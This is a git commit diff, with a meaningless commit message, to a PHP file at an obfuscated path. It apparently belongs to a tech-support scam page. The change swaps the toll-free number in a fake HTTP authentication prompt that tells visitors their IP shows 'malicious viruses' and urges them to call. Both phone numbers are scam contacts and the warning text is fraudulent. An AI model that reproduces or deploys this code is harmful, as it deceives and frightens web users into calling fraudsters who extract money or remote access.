72cc3c44a035e81fc6ae6d2294c69f218c80e651
joyhopson2023 <121514234+joyhopson2023@users.noreply.github.com>
2023-01-21 02:28:13 +0530

    jfhgjkhfgfdg

--- fC0deJdfd008f0d0ED888Err0r80dBG88/WIn101810DE10.php
+++ fC0deJdfd008f0d0ED888Err0r80dBG88/WIn101810DE10.php
@@ -14,7 +14,7 @@
             exit;
         } else {
 
-           header('WWW-Authenticate: Basic realm="Suspicious activity detected on your IP address due to malicious viruses on your computer. Call now toll free @+1-888-341-2106  for any assistance. "');
+           header('WWW-Authenticate: Basic realm="Suspicious activity detected on your IP address due to malicious viruses on your computer. Call now toll free @+1-(888) 323-1326  for any assistance. "');
            header('HTTP/1.0 401 Unauthorized');
 $page = $_SERVER['PHP_SELF'];
  $sec = "0";
